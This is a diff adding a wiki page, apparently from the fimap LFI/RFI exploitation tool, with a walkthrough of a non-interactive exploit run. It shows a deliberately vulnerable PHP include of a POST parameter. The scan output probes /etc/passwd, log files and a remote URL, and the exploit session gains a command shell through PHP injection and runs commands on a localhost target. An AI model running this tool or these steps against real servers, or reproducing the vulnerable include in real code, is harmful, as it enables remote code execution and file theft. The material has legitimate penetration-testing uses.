@@ -1,0 +1,88 @@
+#summary Non Interactive Exploit Run
+= fimap Non-Interactive Exploiting =
+
+== 0. Example PHP Code ==
+{{{
+<? include($_POST["super"]); ?>
+}}}
+
+== 1. fimap result for it ==
+{{{
+imax /st0rage/dev/fimap/src $ ./fimap.py -u http://localhost/test.php -P super=sexy                                                                                                                                                                
+fimap v.1.00_svn (Your best friend!)                                                                                                                                                                                                               
+:: Automatic LFI/RFI scanner and exploiter                                                                                                                                                                                                         
+:: by Iman Karim (fimap.dev@gmail.com)                                                                                                                                                                                                             
+                                                                                                                                                                                                                                                   
+SingleScan is testing URL: 'http://localhost/test.php'                                                                                                                                                                                             
+[04:01:06] [OUT] Inspecting URL 'http://localhost/test.php'...                                                                                                                                                                                     
+[04:01:06] [INFO] Fiddling around with URL...                                                                                                                                                                                                      
+[04:01:06] [OUT] [PHP] Possible file inclusion found! -> 'http://localhost/test.php' with POST-Parameter 'super'.                                                                                                                                  
+[04:01:06] [OUT] [PHP] Identifying Vulnerability 'http://localhost/test.php' with POST-Parameter 'super'...                                                                                                                                        
+[04:01:06] [INFO] Scriptpath received: '/var/www'                                                                                                                                                                                                  
+[04:01:06] [INFO] Operating System is 'Unix-Like'.                                                                                                                                                                                                 
+[04:01:06] [INFO] Testing file '/etc/passwd'...                                                                                                                                                                                                    
+[04:01:07] [INFO] Testing file '/proc/self/environ'...                                                                                                                                                                                             
+[04:01:07] [INFO] Testing file 'php://input'...                                                                                                                                                                                                    
+[04:01:07] [INFO] Testing file '/var/log/apache2/access.log'...                                                                                                                                                                                    
+[04:01:07] [INFO] Testing file '/var/log/apache/access.log'...                                                                                                                                                                                     
+[04:01:07] [INFO] Testing file '/var/log/httpd/access.log'...                                                                                                                                                                                      
+[04:01:07] [INFO] Testing file '/var/log/apache2/access_log'...                                                                                                                                                                                    
+[04:01:07] [INFO] Testing file '/var/log/apache/access_log'...                                                                                                                                                                                     
+[04:01:07] [INFO] Testing file '/var/log/httpd/access_log'...                                                                                                                                                                                      
+[04:01:07] [INFO] Testing file '/var/log/auth.log'...                                                                                                                                                                                              
+[04:01:07] [INFO] Testing file '/var/log/secure'...                                                                                                                                                                                                
+[04:01:07] [INFO] Testing file 'http://www.phpbb.de/index.php'...                                                                                                                                                                                  
+##########################################################                                                                                                                                                                                         
+#[1] Possible PHP-File Inclusion                         #                                                                                                                                                                                         
+##########################################################                                                                                                                                                                                         
+#::REQUEST                                               #                                                                                                                                                                                         
+#  [URL]        http://localhost/test.php                #                                                                                                                                                                                         
+#  [POST]       super=sexy                               #                                                                                                                                                                                         
+#  [HEAD SENT]                                           #                                                                                                                                                                                         
+#::VULN INFO                                             #                                                                                                                                                                                         
+#  [POSTPARM]   super                                    #                                                                                                                                                                                         
+#  [PATH]       /var/www                                 #                                                                                                                                                                                         
+#  [OS]         Unix                                     #                                                                                                                                                                                         
+#  [TYPE]       Absolute Clean + Remote injection        #                                                                                                                                                                                         
+#  [TRUNCATION] No Need. It's clean.                     #                                                                                                                                                                                         
+#  [READABLE FILES]                                      #                                                                                                                                                                                         
+#                   [0] /etc/passwd                      #                                                                                                                                                                                         
+#                   [1] php://input                      #                                                                                                                                                                                         
+#                   [2] http://www.phpbb.de/index.php    #                                                                                                                                                                                         
+##########################################################
+}}}
+
+== 2. Exploiting It ==
+{{{
+imax /st0rage/dev/fimap/src $ ./fimap.py -x --x-host="localhost" --x-vuln=1 --x-cmd='cat test.php' --x-cmd='uname -a'                                                                                                                              
+fimap v.1.00_svn (Your best friend!)                                                                                                                                                                                                               
+:: Automatic LFI/RFI scanner and exploiter                                                                                                                                                                                                         
+:: by Iman Karim (fimap.dev@gmail.com)                                                                                                                                                                                                             
+                                                                                                                                                                                                                                                   
+###########################                                                                                                                                                                                                                        
+#:: List of Domains ::    #                                                                                                                                                                                                                        
+###########################                                                                                                                                                                                                                        
+#[1] localhost            #                                                                                                                                                                                                                        
+#[q] Quit                 #                                                                                                                                                                                                                        
+###########################                                                                                                                                                                                                                        
+WARNING: Some domains may be not listed here because dynamic_rfi is not configured!                                                                                                                                                                
+[04:04:04] [INFO] Trying to autoselect target with hostname 'localhost'...                                                                                                                                                                         
+[04:04:04] [INFO] Autoselected vulnerability with ID 1.                                                                                                                                                                                            
+[04:04:04] [INFO] Testing PHP-code injection thru POST...                                                                                                                                                                                          
+[04:04:04] [OUT] PHP Injection works! Testing if execution works...                                                                                                                                                                                
+[04:04:04] [INFO] Testing execution thru 'popen[b64]'...                                                                                                                                                                                           
+[04:04:04] [OUT] Execution thru 'popen[b64]' works!                                                                                                                                                                                                
+Please wait - Setting up shell (one request)...                                                                                                                                                                                                    
+-------------------------------------------                                                                                                                                                                                                        
+Welcome to fimap shell!                                                                                                                                                                                                                            
+Better dont start interactive commands! ;)                                                                                                                                                                                                        
+Also remember that this is not a persistent shell.                                                                                                                                                                                                 
+Every command opens a new shell and quits it after that!                                                                                                                                                                                           
+Enter 'q' to exit the shell.                                                                                                                                                                                                                       
+-------------------------------------------                                                                                                                                                                                                        
+[04:04:04] [INFO] Executing command: cat test.php                                                                                                                                                                                                  
+<? include($_POST["super"]); ?>                                                                                                                                                                                                                    
+[04:04:04] [INFO] Executing command: uname -a                                                                                                                                                                                                      
+Linux DevelB0x 3.0.0-15-generic #25-Ubuntu SMP Mon Jan 2 17:44:42 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux                                                                                                                                          
+[04:04:04] [INFO] Done with user supplied command batch.
+}}}
